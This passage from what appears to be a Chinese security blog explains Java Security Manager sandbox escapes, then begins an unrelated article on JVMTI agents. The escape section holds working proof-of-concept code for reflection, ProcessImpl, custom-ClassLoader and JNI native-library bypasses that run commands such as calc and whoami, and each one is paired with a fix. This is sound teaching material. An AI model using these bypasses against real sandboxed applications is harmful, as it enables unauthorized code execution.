&#125;&#125; 运行即可绕过安全管理器的限制执行命令弹计算器： 1java -Djava.security.manager -Djava.security.policy=&quot;E:\\\\my.policy&quot; BypassSandbox 修复方法不授予不可信的代码setSecurityManager权限。 利用反射绕过调试分析这里我们调试分析下上面的System.setSecurityManager()这个方法，如下图，该方法实际是调用的setSecurityManager0()方法，其中直接把参数直接赋予了System类中的security变量： 看到System类中，它的security属性时用private修饰的： 123/* The security manager for the system.*/private static volatile SecurityManager security = null; 也就是说，通过反射调用获取该field时是调用getDeclaredField()函数而不是getField()函数。 如果被赋予了反射权限，那么是否能通过反射直接把System类中的security变量值置为null，使Java Security manager失效呢？ 我们先来尝试一下直接通过反射设置该security为null看看是否成功。 假设开发者自定义的策略文件my.policy，授予accessDeclaredMembers权限和suppressAccessChecks权限： 1234grant &#123; permission java.lang.reflect.ReflectPermission &quot;suppressAccessChecks&quot;; permission java.lang.RuntimePermission &quot;accessDeclaredMembers&quot;;&#125;; BypassSandbox类： 1234567891011121314151617import java.lang.reflect.Field;import java.lang.reflect.Method;import java.security.ProtectionDomain;import java.util.Map;public class BypassSandbox &#123; public static void main(String[] args) throws Exception &#123; System.out.println(\"[*]Running setSecurityByReflection()\"); setSecurityByReflection(); &#125; public static void setSecurityByReflection() throws Exception &#123; Class clz = Class.forName(\"java.lang.System\"); Field field = clz.getDeclaredField(\"security\"); field.setAccessible(true); field.set(System.class, null); &#125; 可是运行报NoSuchFieldException的错误信息，显示说是不存在security这个字段： 明明已经用的是getDeclaredField()函数了，为啥还是报不存在该字段的错误呢？ 为此，调试分析getDeclaredField()函数，看看问题在哪。这里看到该函数中调用了privateGetDeclaredFields()函数： 跟进去privateGetDeclaredFields()函数，其中调用Reflection类的filterFields()方法对field进行过滤处理： 跟进Reflection.filterFields()方法，在filter过滤的黑名单中System类的security字段就在其中被过滤了： 看到Reflection类的静态代码中定义了一个fieldFilterMap，即字段过滤Map，这里已经将System类的security字段添加其中了： 12345678static &#123; HashMap var0 = new HashMap(); var0.put(Reflection.class, new String[]&#123;\"fieldFilterMap\", \"methodFilterMap\"&#125;); var0.put(System.class, new String[]&#123;\"security\"&#125;); var0.put(Class.class, new String[]&#123;\"classLoader\"&#125;); fieldFilterMap = var0; methodFilterMap = new HashMap();&#125; 最后，过滤完成之后返回的是System类其他不在黑名单中的字段，当然不包含security： 至此就清楚了确实没办法直接通过反射来设置System类的security字段。 既然负责检查的检察官Java Security Manager不可修改，那就尝试修改检查的材料—ProtectionDomain。 根据Java的设计，一个类的URL和签名组成了这个类的CodeSource，根据policy文件的配置，一个CodeSource有一定的权限。一个类的CodeSource和它的权限构成了这个类的ProtectionDomain。如图： 看到ProtectionDomain类： 123456789101112131415161718192021222324252627public class ProtectionDomain &#123; //.....省略部分代码 static &#123; // Set up JavaSecurityAccess in SharedSecrets SharedSecrets.setJavaSecurityAccess(new JavaSecurityAccessImpl()); &#125; /* CodeSource */ private CodeSource codesource ; /* ClassLoader the protection domain was consed from */ private ClassLoader classloader; /* Principals running-as within this protection domain */ private Principal[] principals; /* the rights this protection domain is granted */ private PermissionCollection permissions; /* if the permissions object has AllPermission */ private boolean hasAllPerm = false; /* the PermissionCollection is static (pre 1.4 constructor) or dynamic (via a policy refresh) */ private boolean staticPermissions; //.....省略部分代码 如前面所说，一个类的CodeSource和Permissions构成了这个类的ProtectionDomain。这里看到hasAllPerm这个字段，应该是一个标记这个类是否有所有权限的布尔变量。因此可以尝试利用反射将它设置为true来看看是否可以使当前类获取所有权限。但是问题在于AccessController会沿着栈自顶向下检查，必须所有栈帧都有权限才能通过。 这里我们也遍历所有栈帧，将所有栈帧中的所有类的ProtectionDomain中的hasAllPerm置为true。BypassSandbox类的代码如下： 123456789101112131415161718192021222324252627import java.lang.reflect.Field;import java.lang.reflect.Method;import java.security.ProtectionDomain;import java.util.Map;public class BypassSandbox &#123; public static void main(String[] args) throws Exception &#123; System.out.println(\"[*]Running setHasAllPerm()\"); setHasAllPerm(); &#125; public static void setHasAllPerm() throws Exception &#123; StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace(); for (StackTraceElement stackTraceElement : stackTraceElements) &#123; try &#123; Class clz = Class.forName(stackTraceElement.getClassName()); Field field = clz.getProtectionDomain().getClass().getDeclaredField(\"hasAllPerm\"); field.setAccessible(true); field.set(clz.getProtectionDomain(), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; Runtime.getRuntime().exec(\"calc\"); &#125;&#125; 可是运行之后还是报错，说是没有getProtectionDomain的权限： 这就很尴尬了。我们看下getProtectionDomain()函数的实现，先检查了权限，然后再调用私有的原生方法getProtectionDomain0()来获取ProtectionDomain： 1234567891011121314151617181920212223242526272829303132333435363738/*** Returns the &#123;@code ProtectionDomain&#125; of this class. If there is a* security manager installed, this method first calls the security* manager's &#123;@code checkPermission&#125; method with a* &#123;@code RuntimePermission(\"getProtectionDomain\")&#125; permission to* ensure it's ok to get the* &#123;@code ProtectionDomain&#125;.** @return the ProtectionDomain of this class** @throws SecurityException* if a security manager exists and its* &#123;@code checkPermission&#125; method doesn't allow* getting the ProtectionDomain.** @see java.security.ProtectionDomain* @see SecurityManager#checkPermission* @see java.lang.RuntimePermission* @since 1.2*/public java.security.ProtectionDomain getProtectionDomain() &#123; SecurityManager sm = System.getSecurityManager(); if (sm != null) &#123; sm.checkPermission(SecurityConstants.GET_PD_PERMISSION); &#125; java.security.ProtectionDomain pd = getProtectionDomain0(); if (pd == null) &#123; if (allPermDomain == null) &#123; java.security.Permissions perms = new java.security.Permissions(); perms.add(SecurityConstants.ALL_PERMISSION); allPermDomain = new java.security.ProtectionDomain(null, perms); &#125; pd = allPermDomain; &#125; return pd;&#125; 那么我们完全可以通过反射直接运行getProtectionDomain0()方法，从而绕过对getProtectionDomain()方法的过滤，进而直接Bypass安全管理器。 Bypass利用——getProtectionDomain0BypassSandbox类的代码如下： 1234567891011121314151617181920212223242526272829303132333435import java.lang.reflect.Field;import java.lang.reflect.Method;import java.security.ProtectionDomain;import java.util.Map;public class BypassSandbox &#123; public static void main(String[] args) throws Exception &#123; System.out.println(\"[*]Running setHasAllPerm0()\"); setHasAllPerm0(\"calc\"); &#125; public static void setHasAllPerm0(String command) throws Exception &#123; StackTraceElement[] stackTraceElements = Thread.currentThread().getStackTrace(); //遍历栈帧 for (StackTraceElement stackTraceElement : stackTraceElements) &#123; try &#123; Class clz = Class.forName(stackTraceElement.getClassName()); //利用反射调用getProtectionDomain0方法 Method getProtectionDomain = clz.getClass().getDeclaredMethod(\"getProtectionDomain0\", null); getProtectionDomain.setAccessible(true); ProtectionDomain pd = (ProtectionDomain) getProtectionDomain.invoke(clz); if (pd != null) &#123; Field field = pd.getClass().getDeclaredField(\"hasAllPerm\"); field.setAccessible(true); field.set(pd, true); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; Runtime.getRuntime().exec(command); &#125;&#125; 运行即可绕过getProtectionDomain()方法的过滤和安全管理器的限制执行命令弹计算器： Bypass利用——ProcessImpl有些方法的实现是，在public方法里面调用Security Manager检查权限，然后调用一个protect或者private方法实现功能。这样，攻击者可以直接反射实现功能的方法，绕过Security Manager的检查。例如平时我们调用Runtime.getRuntime().exec(command)，其实际的代码实现如下，是调用的ProcessBuilder.start()实现的： 1234567public Process exec(String[] cmdarray, String[] envp, File dir) throws IOException &#123; return new ProcessBuilder(cmdarray) .environment(envp) .directory(dir) .start();&#125; 点进ProcessBuilder.start()函数中看其实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public Process start() throws IOException &#123; // Must convert to array first -- a malicious user-supplied // list might try to circumvent the security check. String[] cmdarray = command.toArray(new String[command.size()]); cmdarray = cmdarray.clone(); for (String arg : cmdarray) if (arg == null) throw new NullPointerException(); // Throws IndexOutOfBoundsException if command is empty String prog = cmdarray[0]; SecurityManager security = System.getSecurityManager(); if (security != null) security.checkExec(prog); String dir = directory == null ? null : directory.toString(); for (int i = 1; i &lt; cmdarray.length; i++) &#123; if (cmdarray[i].indexOf('\\u0000') &gt;= 0) &#123; throw new IOException(\"invalid null character in command\"); &#125; &#125; try &#123; return ProcessImpl.start(cmdarray, environment, dir, redirects, redirectErrorStream); &#125; catch (IOException | IllegalArgumentException e) &#123; String exceptionInfo = \": \" + e.getMessage(); Throwable cause = e; if ((e instanceof IOException) &amp;&amp; security != null) &#123; // Can not disclose the fail reason for read-protected files. try &#123; security.checkRead(prog); &#125; catch (SecurityException se) &#123; exceptionInfo = \"\"; cause = se; &#125; &#125; // It's much easier for us to create a high-quality error // message than the low-level C code which found the problem. throw new IOException( \"Cannot run program \\\"\" + prog + \"\\\"\" + (dir == null ? \"\" : \" (in directory \\\"\" + dir + \"\\\")\") + exceptionInfo, cause); &#125;&#125; 可以看到，显示检查了是否有执行命令的权限，然后实际是调用了ProcessImpl.start()方法来实现命令执行。也就是说，完成功能的是ProcessImpl.start()方法，而在这个方法调用之前，Java Security Manager就已经完成了检测。因此，当我们直接反射调用这个方法时，就能成功绕过Java Security Manager的检测过滤。 BypassSandbox类： 123456789101112131415161718import java.lang.reflect.Field;import java.lang.reflect.Method;import java.security.ProtectionDomain;import java.util.Map;public class BypassSandbox &#123; public static void main(String[] args) throws Exception &#123; System.out.println(\"[*]Running reflectProcessImpl()\"); reflectProcessImpl(\"calc\"); &#125; public static void reflectProcessImpl(String command) throws Exception &#123; Class clz = Class.forName(\"java.lang.ProcessImpl\"); Method method = clz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); method.invoke(clz, new String[]&#123;command&#125;, null, null, null, false); &#125;&#125; 运行即可绕过安全管理器的限制执行命令弹计算器： 1java -Djava.security.manager -Djava.security.policy=&quot;E:\\\\my.policy&quot; BypassSandbox 修复方法不授予accessDeclaredMembers权限和suppressAccessChecks权限。 然而在Java中，反射是一个非常常见的操作，如果由于业务需要，无法禁用反射，但可以设置禁止反射的方法和变量的黑名单。比如前面调试分析的在sun.reflect.Reflection中定义了静态的methodFilterMap和fieldMethodMap，在这里面的方法和变量禁止反射。sun.reflect.Reflection还提供了几个方法，可以往methodFilterMap和fieldMethodMap中添加自定义的黑名单。代码如下： 123456public static synchronized void registerFieldsToFilter(Class&lt;?&gt; var0, String... var1) &#123; fieldFilterMap = registerFilter(fieldFilterMap, var0, var1);&#125;public static synchronized void registerMethodsToFilter(Class&lt;?&gt; var0, String... var1) &#123; methodFilterMap = registerFilter(methodFilterMap, var0, var1);&#125; 这样，只需要在加载恶意代码之前，把禁止反射的黑名单加入这两个Map即可。 创建ClassLoader绕过Bypass利用一个类的ProtectionDomain在这个类被ClassLoader加载时初始化。 如果我们能自定义一个ClassLoader来加载一个恶意类，并且把它的ProtectionDomain里面的权限初始化成所有权限，这样就能绕过Java Security Manager了。然而，当这个恶意类被调用时，它仅仅是栈中的一个栈帧，在它下面的栈帧对应的权限仍是policy文件指定的权限。 这个时候就是doPrivileged()发挥作用的时候了。AccessController会自顶向下遍历栈帧，如果遍历到doPrivileged，它会检查到调用doPrivileged()方法的栈帧为止。只要我们在恶意类中调用doPrivileged()方法，AccessController只会向下遍历检查到恶意类所在的栈帧，而恶意类对应的权限是所有权限，这样就可以绕过Java Security Manager了。 假设开发者自定义的策略文件my.policy，设置了createClassLoader权限和任意文件读取权限： 1234grant&#123; permission java.lang.RuntimePermission &quot;createClassLoader&quot;; permission java.io.FilePermission &quot;&lt;&lt;ALL FILES&gt;&gt;&quot;, &quot;read&quot;;&#125;; Exploit类，静态代码中调用AccessController.doPrivileged()函数，其中执行恶意命令： 12345678910111213141516171819202122import java.security.AccessController;import java.security.PrivilegedAction;public class Exploit &#123; public Exploit() &#123; &#125; static &#123; AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; try &#123; Process process = Runtime.getRuntime().exec(\"calc\"); return null; &#125; catch (Exception var2) &#123; var2.printStackTrace(); return null; &#125; &#125; &#125;); &#125;&#125; MyClassLoader类： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.nio.ByteBuffer;import java.nio.channels.Channels;import java.nio.channels.FileChannel;import java.nio.channels.WritableByteChannel;import java.security.*;import java.security.cert.Certificate;public class MyClassLoader extends ClassLoader &#123; public MyClassLoader() &#123; &#125; public MyClassLoader(ClassLoader parent) &#123; super(parent); &#125; @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; File file = getClassFile(name); try &#123; byte[] bytes = getClassBytes(file); //在这里调用defineClazz，而不是super.defineClass Class&lt;?&gt; c = defineClazz(name, bytes, 0, bytes.length); return c; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return super.findClass(name); &#125; protected final Class&lt;?&gt; defineClazz(String name, byte[] b, int off, int len) throws ClassFormatError &#123; try &#123; PermissionCollection pc = new Permissions(); pc.add(new AllPermission()); //设置ProtectionDomain ProtectionDomain pd = new ProtectionDomain(new CodeSource(null, (Certificate[]) null), pc, this, null); return this.defineClass(name, b, off, len, pd); &#125; catch (Exception e) &#123; return null; &#125; &#125; private File getClassFile(String name) &#123; File file = new File(\"./\" + name + \".class\"); return file; &#125; private byte[] getClassBytes(File file) throws Exception &#123; FileInputStream fis = new FileInputStream(file); FileChannel fc = fis.getChannel(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); WritableByteChannel wbc = Channels.newChannel(baos); ByteBuffer by = ByteBuffer.allocate(1024); while (true) &#123; int i = fc.read(by); if (i == 0 || i == -1) &#123; break; &#125; by.flip(); wbc.write(by); by.clear(); &#125; fis.close(); return baos.toByteArray(); &#125;&#125; BypassSandbox类： 12345678public class BypassSandbox &#123; public static void main(String[] args) throws Exception &#123; MyClassLoader mcl = new MyClassLoader(); Class&lt;?&gt; c1 = Class.forName(\"Exploit\", true, mcl); Object obj = c1.newInstance(); System.out.println(obj.getClass().getClassLoader()); &#125;&#125; 此时尝试运行会发现报错： 1java -Djava.security.manager -Djava.security.policy=\"E:\\\\my.policy\" BypassSandbox 具体执行失败的原因可以参考threedr3am大佬的解释：自定义ClassLoader绕过poc为什么很多人执行出现问题的缘由 #2 一个简单的解决办法就是，在自定义的ClassLoader中重写loadClass()方法： 1234567@Overridepublic Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123; if (name.contains(\"Exploit\")) &#123; return findClass(name); &#125; return super.loadClass(name);&#125; 再试一下就OK了： 修复方法禁止createClassLoader权限。 调用本地方法绕过Bypass利用Java Security Manager是在Java核心库中的一个功能，而Java中native方法是由JVM执行的，不受Java Security Manager管控。因此，我们可以调用Java native方法，绕过Java Security Manager。 my.policy，允许loadLibrary以及根目录下任意文件读权限： 1234grant&#123; permission java.lang.RuntimePermission &quot;loadLibrary.*&quot;; permission java.io.FilePermission &quot;/root/-&quot;, &quot;read&quot;;&#125;; EvilMethodClass类，声明一个native方法： 12345678910package com.evil;public class EvilMethodClass &#123; //加载动态链接库 static &#123; System.load(\"/root/libEvilMethodClass.so\"); &#125; //声明一个native方法 public static native String evilMethod(String name);&#125; 生成.h头： 123javac src/com/evil/EvilMethodClass.java -d ./binjavah -jni -classpath ./bin -d ./jni com.evil.EvilMethodClassjavah -jni -classpath ./bin -o EvilMethodClass.h com.evil.EvilMethodClass 新建EvilMethodClass.c： 12345678910111213141516171819202122232425262728#include \"com_evil_EvilMethodClass.h\"#include&lt;stdlib.h&gt;#ifdef __cplusplusextern \"C\"&#123;#endifJNIEXPORT jstring JNICALL Java_com_evil_EvilMethodClass_evilMethod( JNIEnv *env, jclass cls, jstring j_str)&#123; const char *c_str = NULL; char buff[128] = &#123; 0 &#125;; c_str = (*env)-&gt;GetStringUTFChars(env, j_str, NULL); if (c_str == NULL) &#123; printf(\"out of memory.n\"); return NULL; &#125; //在这里执行系统命令 system(c_str); (*env)-&gt;ReleaseStringUTFChars(env, j_str, c_str); return (*env)-&gt;NewStringUTF(env, buff);&#125;#ifdef __cplusplus&#125;#endif 编译，生成动态链接库，然后放到/root/目录下： 1gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared EvilMethodClass.c -o libEvilMethodClass.so Poc.java： 12345public class Poc &#123; public static void main(String[] args)&#123; EvilMethodClass.evilMethod(\"whoami\"); &#125;&#125; 这里将Poc.java和EvilMethodClass.java一同打包成jar，然后在Kali中运行即可绕过Java Security Manager： 1java -Djava.security.manager -Djava.security.policy=my.policy -jar exp.jar 修复方案不授予loadLibrary权限。 0x04 参考java中的安全模型(沙箱机制) java沙箱绕过 Twenty years of Escaping the Java Sandbox Java沙箱逃逸走过的二十个春秋（一） 0x05 附录A 权限名 用途说明 accessClassInPackage. 允许代码访问指定包中的类 accessDeclaredMembers 允许代码使用反射访问其他类中私有或保护的成员 createClassLoader 允许代码实例化类加载器 createSecurityManager 允许代码实例化安全管理器，它将允许程序化的实现对沙箱的控制 defineClassInPackage. 允许代码在指定包中定义类 exitVM 允许代码关闭整个虚拟机 getClassLoader 允许代码访问类加载器以获得某个特定的类 getProtectionDomain 允许代码访问保护域对象以获得某个特定类 loadlibrary. 允许代码装载指定类库 modifyThread 允许代码调整指定的线程参数 modifyThreadGroup 允许代码调整指定的线程组参数 queuePrintJob 允许代码初始化一个打印任务 readFileDescriptor 允许代码读文件描述符（相应的文件是由其他保护域中的代码打开的） setContextClassLoader 允许代码为某线程设置上下文类加载器 setFactory 允许代码创建套接字工厂 setIO 允许代码重定向System.in、System.out或System.err输入输出流 setSecurityManager 允许代码设置安全管理器 stopThread 允许代码调用线程类的stop()方法 writeFileDescriptor 允许代码写文件描述符 B 权限名 用途说明 accessClipboard 允许访问系统的全局剪贴板 accessEventQueue 允许直接访问事件队列 createRobot 允许代码创建AWT的Robot类 listenToAllAWTEvents 允许代码直接监听事件分发 readDisplayPixels 允许AWT Robot读显示屏上的像素 showWindowWithoutWarningBanner 允许创建无标题栏的窗口 C 权限名 用途说明 specifyStreamHandler 允许在URL类中安装新的流处理器 setDefaultAuthenticator 可以安装鉴别类 requestPassworkAuthentication 可以完成鉴别 D 权限名 用途说明 addIdentityCertificate 为Identity增加一个证书 clearProviderProperties. 针对指定的提供者，删除所有属性 createAccessControlContext 允许创建一个存取控制器的上下文环境 getDomainCombiner 允许撤销保护域 getPolicy 检索可以实现沙箱策略的类 getProperty. 读取指定的安全属性 getSignerPrivateKey 由Signer对象获取私有密钥 insertProvider. 将指定的提供者添加到响应的安全提供者组中 loadProviderProperties. 装载指定的提供者的属性 printIdentity 打印Identity类内容 putAllProviderProperties. 更新指定的提供者的属性 putProviderProperty. 为指定的提供者增加一个属性 removeIdentityCertificate 取消Identity对象的证书 removeProvider. 将指定的提供者从相应的安全提供者组中删除 removeProviderProperty. 删除指定的安全提供者的某个属性 setIdentityInfo 为某个Identity对象设置信息串 setIdentityPublicKey 为某个Identity对象设置公钥 setPolicy 设置可以实现沙箱策略的类 setProperty. 设置指定的安全属性 setSignerKeyPair 在Signer对象中设置密钥对 setSystemScope 设置系统所用的IdentityScope E 权限名 用途说明 enableSubstitution 允许实现ObjectInputStream类的enableResolveObject()方法和ObjectOutputStream类的enableReplaceObject()方法 enableSubclassImplementation 允许ObjectInputStream和ObjectOutputStream创建子类，子类可以覆盖readObject()和writeObject()方法","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"沙箱逃逸","slug":"沙箱逃逸","permalink":"https://www.mi1k7ea.com/tags/沙箱逃逸/"}]},{"title":"浅谈JVMTI","date":"2020-05-03T04:11:06.000Z","path":"2020/05/03/浅谈JVMTI/","text":"0x01 JVMTI简介JVMTI（JVM Tool Interface）是 Java 虚拟机所提供的 native 编程接口，是 JVMPI（Java Virtual Machine Profiler Interface）和 JVMDI（Java Virtual Machine Debug Interface）的更新版本。从这个 API 的发展历史轨迹中我们就可以知道，JVMTI 提供了可用于 debug 和 profiler 的接口；同时，在 Java 5/6 中，虚拟机接口也增加了监听（Monitoring），线程分析（Thread analysis）以及覆盖率分析（Coverage Analysis）等功能。正是由于 JVMTI 的强大功能，它是实现 Java 调试器，以及其它 Java 运行态测试与分析工具的基础。 JVMTI 并不一定在所有的 Java 虚拟机上都有实现，不同的虚拟机的实现也不尽相同。不过在一些主流的虚拟机中，比如 Sun 和 IBM，以及一些开源的如 Apache Harmony DRLVM 中，都提供了标准 JVMTI 实现。 JVMTI 是一套本地代码接口，因此使用 JVMTI 需要我们与 C/C++ 以及 JNI 打交道。事实上，开发时一般采用建立一个 Agent 的方式来使用 JVMTI，它使用 JVMTI 函数，设置一些回调函数，并从 Java 虚拟机中得到当前的运行态信息，并作出自己的判断，最后还可能操作虚拟机的运行态。把 Agent 编译成一个动态链接库之后，我们就可以在 Java 程序启动的时候来加载它（启动加载模式），也可以在 Java 5 之后使用运行时加载（活动加载模式）。 -agentlib:agent-lib-name=options -agentpath:path-to-agent=options 注意：这里的 Agent 即 JVMTI 的客户端，它和执行 Java 程序的虚拟机运行在同一个进程上，因此通常他们的实现都很紧凑，他们通常由另一个独立的进程控制，充当这个独立进程和当前虚拟机之间的中介，通过调用 JVMTI 提供的接口和虚拟机交互，负责获取并返回当前虚拟机的状态或者转发控制命令。 0x02 Agent的工作过程启动Agent 是在 Java 虚拟机启动之时加载的，这个加载处于虚拟机初始化的早期，在这个时间点上： 所有的 Java 类都未被初始化； 所有的对象实例都未被创建； 因而，没有任何 Java 代码被执行； 但在这个时候，我们已经可以： 操作 JVMTI 的 Capability 参数； 使用系统参数； 动态库被加载之后，虚拟机会先寻找一个 Agent 入口函数： 1JNIEXPORT jint JNICALL Agent_OnLoad(JavaVM *vm, char *options, void *reserved) 在这个函数中，虚拟机传入了一个 JavaVM 指针，以及命令行的参数。通过 JavaVM，我们可以获得 JVMTI 的指针，并获得 JVMTI 函数的使用能力，所有的 JVMTI 函数都通过这个 jvmtiEnv 获取，不同的虚拟机实现提供的函数细节可能不一样，但是使用的方式是统一的。 12jvmtiEnv *jvmti; (*jvm)-&gt;GetEnv(jvm, &amp;jvmti, JVMTI_VERSION_1_0); 这里传入的版本信息参数很重要，不同的 JVMTI 环境所提供的功能以及处理方式都可能有所不同，不过它在同一个虚拟机中会保持不变（有心的读者可以去比较一下 JNI 环境）。命令行参数事实上就是上面启动命令行中的 options 部分，在 Agent 实现中需要进行解析并完成后续处理工作。参数传入的字符串仅仅在 Agent_OnLoad 函数里有效，如果需要长期使用，开发者需要做内存的复制工作，同时在最后还要释放这块存储。另外，有些 JDK 的实现会使用 JAVA_TOOL_OPTIONS 所提供的参数，这个常见于一些嵌入式的 Java 虚拟机（不使用命令行）。需要强调的是，这个时候由于虚拟机并未完成初始化工作，并不是所有的 JVMTI 函数都可以被使用。 Agent 还可以在运行时加载，如果您了解 Java Instrument 模块（可以参考这篇文章），您一定对它的运行态加载有印象，这个新功能事实上也是 Java Agent 的一个实现。具体说来，虚拟机会在运行时监听并接受 Agent 的加载，在这个时候，它会使用 Agent 的： 1JNIEXPORT jint JNICALL Agent_OnAttach(JavaVM* vm, char *options, void *reserved); 同样的在这个初始化阶段，不是所有的 JVMTI 的 Capability 参数都处于可操作状态，而且 options 这个 char 数组在这个函数运行之后就会被丢弃，如果需要，需要做好保留工作。 Agent 的主要功能是通过一系列的在虚拟机上设置的回调（callback）函数完成的，一旦某些事件发生，Agent 所设置的回调函数就会被调用，来完成特定的需求。 卸载最后，Agent 完成任务，或者虚拟机关闭的时候，虚拟机都会调用一个类似于类析构函数的方法来完成最后的清理任务，注意这个函数和虚拟机自己的 VM_DEATH 事件是不同的。 1JNIEXPORT void JNICALL Agent_OnUnload(JavaVM *vm) 0x03 JVMTI的环境和错误处理我们使用 JVMTI 的过程，主要是设置 JVMTI 环境，监听虚拟机所产生的事件，以及在某些事件上加上我们所希望的回调函数。 JVMTI环境我们可以通过操作 jvmtiCapabilities 来查询、增加、修改 JVMTI 的环境参数。当然，对于每一个不同的虚拟机来说，基于他们的实现不尽相同，导致了 JVMTI 的环境也不一定一致。标准的 jvmtiCapabilities 定义了一系列虚拟机的功能，比如 can_redefine_any_class 定义了虚拟机是否支持重定义类，can_retransform_classes 定义了是否支持在运行的时候改变类定义等等。如果熟悉 Java Instrumentation，一定不会对此感到陌生，因为 Instrumentation 就是对这些在 Java 层上的包装。对用户来说，这块最主要的是查看当前 JVMTI 环境，了解虚拟机具有的功能。要了解这个，其实很简单，只需通过对 jvmtiCapabilities 的一系列变量的考察就可以。 1234err = (*jvmti)-&gt;GetCapabilities(jvmti, &amp;capa); // 取得 jvmtiCapabilities 指针。if (err == JVMTI_ERROR_NONE) &#123; if (capa.can_redefine_any_class) &#123; ... &#125;&#125; // 查看是否支持重定义类 另外，虚拟机有自己的一些功能，一开始并未被启动，那么增加或修改 jvmtiCapabilities 也是可能的，但不同的虚拟机对这个功能的处理也不太一样，多数的虚拟机允许增改，但是有一定的限制，比如仅支持在 Agent_OnLoad 时，即虚拟机启动时作出，它某种程度上反映了虚拟机本身的构架。开发人员无需要考虑 Agent 的性能和内存占用，就可以在 Agent 被加载的时候启用所有功能： 12345err = (*jvmti)-&gt;GetPotentialCapabilities(jvmti, &amp;capa); // 取得所有可用的功能if (err == JVMTI_ERROR_NONE) &#123; err = (*jvmti)-&gt;AddCapabilities(jvmti, &amp;capa); ...&#125; 最后我们要注意的是，JVMTI 的函数调用都有其时间性，即特定的函数只能在特定的虚拟机状态下才能调用，比如 SuspendThread（挂起线程）这个动作，仅在 Java 虚拟机处于运行状态（live phase）才能调用，否则导致一个内部异常。 JVMTI错误处理JVMTI 沿用了基本的错误处理方式，即使用返回的错误代码通知当前的错误，几乎所有的 JVMTI 函数调用都具有以下模式： 1jvmtiError err = jvmti-&gt;someJVMTImethod (somePara … ); 其中 err 就是返回的错误代码，不同函数的错误信息可以在 Java 规范里查到。 0x04 JVMTI基本功能JVMTI 的功能非常丰富，包含了虚拟机中线程、内存 / 堆 / 栈，类 / 方法 / 变量，事件 / 定时器处理等等 20 多类功能，下面我们介绍一下，并举一些简单列子。 事件处理和回调函数从上文我们知道，使用 JVMTI 一个基本的方式就是设置回调函数，在某些事件发生的时候触发并作出相应的动作。因此这一部分的功能非常基本，当前版本的 JVMTI 提供了许多事件（Event）的回调，包括虚拟机初始化、开始运行、结束，类的加载，方法出入，线程始末等等。如果想对这些事件进行处理，我们需要首先为该事件写一个函数，然后在 jvmtiEventCallbacks 这个结构中指定相应的函数指针。比如，我们对线程启动感兴趣，并写了一个 HandleThreadStart 函数，那么我们需要在 Agent_OnLoad 函数里加入： 1234jvmtiEventCallbacks eventCallBacks;memset(&amp;ecbs, 0, sizeof(ecbs)); // 初始化eventCallBacks.ThreadStart = &amp;HandleThreadStart; // 设置函数指针... 在设置了这些回调之后，就可以调用下述方法，来最终完成设置。在接下来的虚拟机运行过程中，一旦有线程开始运行发生，虚拟机就会回调 HandleThreadStart 方法。 1jvmti-&gt;SetEventCallbacks(eventCallBacks, sizeof(eventCallBacks)); 设置回调函数的时候，开发者需要注意以下几点： 如同 Java 异常机制一样，如果在回调函数中自己抛出一个异常（Exception），或者在调用 JNI 函数的时候制造了一些麻烦，让 JNI 丢出了一个异常，那么任何在回调之前发生的异常就会丢失，这就要求开发人员要在处理错误的时候需要当心。 虚拟机不保证回调函数会被同步，换句话说，程序有可能同时运行同一个回调函数（比如，好几个线程同时开始运行了，这个 HandleThreadStart 就会被同时调用几次），那么开发人员在开发回调函数时需要处理同步的问题。 内存控制和对象获取内存控制是一切运行态的基本功能。 JVMTI 除了提供最简单的内存申请和撤销之外（这块内存不受 Java 堆管理，开发人员需要自行进行清理工作，不然会造成内存泄漏），也提供了对 Java 堆的操作。众所周知，Java 堆中存储了 Java 的类、对象和基本类型（Primitive），通过对堆的操作，开发人员可以很容易的查找任意的类、对象，甚至可以强行执行垃圾收集工作。 JVMTI 中对 Java 堆的操作与众不同，它没有提供一个直接获取的方式（由此可见，虚拟机对对象的管理并非是哈希表，而是某种树 / 图方式），而是使用一个迭代器（iterater）的方式遍历： 123456jvmtiError FollowReferences(jvmtiEnv* env, jint heap_filter, jclass klass, jobject initial_object,// 该方式可以指定根节点 const jvmtiHeapCallbacks* callbacks,// 设置回调函数 const void* user_data) 或者 12345jvmtiError IterateThroughHeap(jvmtiEnv* env, jint heap_filter, jclass klass, const jvmtiHeapCallbacks* callbacks, const void* user_data)// 遍历整个 heap 在遍历的过程中，开发者可以设定一定的条件，比如，指定是某一个类的对象，并设置一个回调函数，如果条件被满足，回调函数就会被执行。开发者可以在回调函数中对当前传回的指针进行打标记（tag）操作——这又是一个特殊之处，在第一遍遍历中，只能对满足条件的对象进行 tag ；然后再使用 GetObjectsWithTags 函数，获取需要的对象。 123456jvmtiError GetObjectsWithTags(jvmtiEnv* env, jint tag_count, const jlong* tags, // 设定特定的 tag，即我们上面所设置的 jint* count_ptr, jobject** object_result_ptr, jlong** tag_result_ptr) 如果你仅仅想对特定 Java 对象操作，应该避免设置其他类型的回调函数，否则会影响效率，举例来说，多增加一个 primitive 的回调函数，可能会使整个操作效率下降一个数量级。 线程和锁线程是 Java 运行态中非常重要的一个部分，在 JVMTI 中也提供了很多 API 进行相应的操作，包括查询当前线程状态，暂停，恢复或者终端线程，还可以对线程锁进行操作。开发者可以获得特定线程所拥有的锁： 1234jvmtiError GetOwnedMonitorInfo(jvmtiEnv* env, jthread thread, jint* owned_monitor_count_ptr, jobject** owned_monitors_ptr) 也可以获得当前线程正在等待的锁： 123jvmtiError GetCurrentContendedMonitor(jvmtiEnv* env, jthread thread, jobject* monitor_ptr) 